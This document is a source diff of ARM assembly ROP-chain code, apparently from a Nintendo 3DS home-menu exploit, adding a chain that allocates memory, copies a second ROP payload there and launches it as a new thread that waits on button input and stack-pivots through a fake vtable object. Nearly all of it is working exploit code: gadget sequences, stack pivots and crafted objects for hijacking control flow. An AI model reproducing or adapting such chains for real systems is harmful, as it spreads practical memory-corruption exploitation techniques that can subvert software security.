@@ -40,6 +40,8 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 	#endif
 #endif
 
+#define NEWTHREAD_ROPBUFFER 0x0ff00000
+
 .macro ROP_SETLR lr
 .word POP_R1PC
 .word ROP_POPPC @ r1
@@ -171,6 +173,8 @@ ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4FPPC @ Begin the stack-pivot
 .endm
 
 .macro ROPMACRO_CMPDATA cmpaddr, cmpword, stackaddr_cmpmismatch, stackaddr_cmpmatch
+ROP_SETLR ROP_POPPC
+
 .word POP_R0PC
 .word HEAPBUF + ((. + 0x14) - _start) @ r0
 
@@ -349,10 +353,10 @@ sdfile_imagedisplay_path:
 
 #ifdef LOADSDCFG
 menuhax_cfg:
-.space 0x20
+.space 0x24
 
 menuhax_cfg_new:
-.space 0x20
+.space 0x24
 #endif
 
 #ifdef LOADOTHER_THEMEDATA
@@ -517,7 +521,7 @@ CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
 
 CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_cfg_path - _start)), 1, 0
 
-CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (menuhax_cfg - _start)), 0x20
+CALLFUNC_NOSP IFile_Read, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (menuhax_cfg - _start)), 0x24
 
 ROP_SETLR ROP_POPPC
 
@@ -559,7 +563,7 @@ ROPMACRO_STACKPIVOT (HEAPBUF + (rop_cfg_cmpbegin1 - _start)), ROP_POPPC
 
 rop_cfg_cmpbegin_exectypeprepare:
 
-CALLFUNC_NOSP MEMCPY, (HEAPBUF + ((menuhax_cfg_new) - _start)), (HEAPBUF + ((menuhax_cfg) - _start)), 0x20, 0
+CALLFUNC_NOSP MEMCPY, (HEAPBUF + ((menuhax_cfg_new) - _start)), (HEAPBUF + ((menuhax_cfg) - _start)), 0x24, 0
 
 ROP_SETLR ROP_POPPC
 
@@ -577,7 +581,7 @@ CALLFUNC_NOSP MEMSET32_OTHER, (HEAPBUF + (IFile_ctx - _start)), 0x20, 0, 0
 
 CALLFUNC_NOSP IFile_Open, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (sdfile_cfg_path - _start)), 0x3, 0
 
-CALLFUNC IFile_Write, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (menuhax_cfg_new - _start)), 0x20, 1, 0, 0, 0
+CALLFUNC IFile_Write, (HEAPBUF + (IFile_ctx - _start)), (HEAPBUF + (tmp_scratchdata - _start)), (HEAPBUF + (menuhax_cfg_new - _start)), 0x24, 1, 0, 0, 0
 
 ROP_SETLR ROP_POPPC
 
@@ -739,6 +743,30 @@ ROPMACRO_STACKPIVOT (HEAPBUF + (padcheck_finish_jump - _start)), ROP_POPPC
 
 ret2menu_rop:
 
+@ When u32 cfg+0x20 != 0x0, goto to ret2menu_rop_createthread, otherwise jump to ret2menu_rop_returnmenu.
+ROPMACRO_CMPDATA (HEAPBUF + ((menuhax_cfg+0x20) - _start)), 0x0, (HEAPBUF + (ret2menu_rop_createthread - _start)), 0x0
+ROPMACRO_STACKPIVOT (HEAPBUF + (ret2menu_rop_returnmenu - _start)), ROP_POPPC
+
+ret2menu_rop_createthread:
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word (HEAPBUF + (newthread_rop_r1data_cmphid - _start)) @ r0
+
+.word POP_R1PC
+.word (HEAPBUF + ((menuhax_cfg+0x20) - _start)) @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from cfg+0x20 to newthread_rop_r1data_cmphid.
+
+CALLFUNC svcControlMemory, (HEAPBUF + (tmp_scratchdata - _start)), NEWTHREAD_ROPBUFFER, 0, (((newthread_ropend - newthread_ropstart) + 0xfff) & ~0xfff), 0x3, 0x3, 0, 0
+
+CALLFUNC_NOSP MEMCPY, NEWTHREAD_ROPBUFFER, (HEAPBUF + (newthread_ropstart - _start)), (newthread_ropend - newthread_ropstart), 0
+
+@ svcCreateThread(<tmp_scratchdata addr>, ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 28, -2);
+
+CALLFUNC svcCreateThread, (HEAPBUF + (tmp_scratchdata - _start)), ROP_POPPC, 0, NEWTHREAD_ROPBUFFER, 45, -2, 0, 0
+
+ret2menu_rop_returnmenu:
 RET2MENUCODE
 
 padcheck_finish_jump:
@@ -1054,6 +1082,76 @@ ROPMACRO_STACKPIVOT (HEAPBUF + (ropfinish_sleepthread - _start)), ROP_POPPC
 .word ROP_BXR1 @ This is used as an infinite loop.
 
 .word 0x58584148
+
+newthread_ropstart:
+
+@ Sleep 5-seconds.
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word 0x2A05F200 @ r0
+
+.word POP_R1PC
+.word 0x1 @ r1
+
+.word svcSleepThread
+
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word NEWTHREAD_ROPBUFFER + (newthread_rop_r0data_cmphid - newthread_ropstart) @ r0
+
+.word POP_R1PC
+.word 0x1000001c @ r1
+
+.word ROP_LDRR1R1_STRR1R0 @ Copy the u32 from *0x1000001c to newthread_rop_r0data_cmphid, current HID PAD state.
+
+.word POP_R0PC
+newthread_rop_r0data_cmphid:
+.word 0 @ r0
+
+.word POP_R1PC
+newthread_rop_r1data_cmphid:
+.word 0x0 @ r1, overwritten with data from cfg eariler.
+
+.word ROP_CMPR0R1 @ Compare current PAD state with the cfg value.
+
+.word NEWTHREAD_ROPBUFFER + ((newthread_rop_object+0x20) - newthread_ropstart) @ r4
+
+.word POP_R0PC @ Begin the actual stack-pivot ROP.
+.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ r0
+
+.word ROP_LOADR4_FROMOBJR0+8 @ When the current PAD state matches the cfg value, continue the ROP, otherwise stack-pivot to newthread_ropstart.
+
+.word 0, 0, 0 @ r4..r6
+
+.word 0x41424344 @ Trigger a crash to verify that this worked.
+
+newthread_rop_object:
+.word NEWTHREAD_ROPBUFFER + (newthread_rop_vtable - newthread_ropstart) @ object+0, vtable ptr
+.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
+.word 0 @ Memchunk-hdr stuff writes here.
+.word 0
+
+.word NEWTHREAD_ROPBUFFER + ((newthread_rop_object + 0x20) - newthread_ropstart) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+
+.space ((newthread_rop_object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
+newthread_rop_stackpivot_sploadword:
+.word NEWTHREAD_ROPBUFFER + (newthread_ropstart - newthread_ropstart) @ sp
+newthread_rop_stackpivot_pcloadword:
+.word ROP_POPPC @ pc
+
+.space ((newthread_rop_object + 0x28) - .)
+.word NEWTHREAD_ROPBUFFER + (newthread_rop_object - newthread_ropstart) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
+
+newthread_rop_vtable:
+.word 0, 0 @ vtable+0
+.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
+.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
+.word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20
+
+newthread_ropend:
+.word 0
 
 .align 4
 codedatastart:
